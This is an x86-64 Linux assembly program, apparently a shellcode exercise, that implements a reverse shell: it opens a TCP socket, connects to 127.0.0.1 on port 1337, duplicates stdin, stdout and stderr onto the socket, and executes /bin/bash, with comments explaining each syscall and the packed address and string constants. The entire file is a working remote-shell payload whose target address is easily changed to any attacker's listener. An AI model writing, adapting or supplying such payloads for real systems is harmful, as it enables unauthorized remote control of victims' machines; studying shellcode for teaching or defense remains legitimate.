global _start

section .text

_start:
    ; socket()
    mov rax, 41 
    mov rdi, 2 ; int domain = AF_INET = 2
    mov rsi, 1 ; int type = SOCK_STREAM = 1
    mov rdx, 0 ; int protocol = IPPROTO_IP = 0
    syscall
    mov r8, rax ; r8 stores the sockfd
    
    ; connect() 
    mov rax, 42 
    mov rdi, r8
    ; 0100007f = ip address = 127.0.0.1
    ; 3905 = port = 1337
    ; 0002 = AF_INET = 2
    mov rsi, 0x0100007f39050002
    push rsi 
    mov rsi, rsp ; const struct sockaddr *addr
    mov rdx, 16 ; socklen_t addrlen
    syscall

    ; dup2()
    mov rax, 33
    mov rdi, r8 ; int oldfd
    mov rsi, 0 ; int newfd = stdin
    syscall

    ; dup2()
    mov rax, 33
    mov rsi, 1 ; int newfd = stdout
    syscall

    ; dup2()
    mov rax, 33
    mov rsi, 2 ; int newfd = stderr
    syscall

    ; execve()
    mov rax, 59
    ; 00000000 = null terminator
    ; 68736162 = "bash"
    mov rdi, 0x0000000068736162
    push rdi
    ; 2f6e6962 = "bin/"
    ; 2f2f2f2f  = "////"
    mov rdi, 0x2f6e69622f2f2f2f
    push rdi
    mov rdi, rsp ; const char *filename
    mov rsi, 0 ; char *const argv[]
    mov rdx, 0 ; char *const envp[]
    syscall

    ; exit()
    mov rax, 60
    mov rdi, 0 ; int status
    syscall  

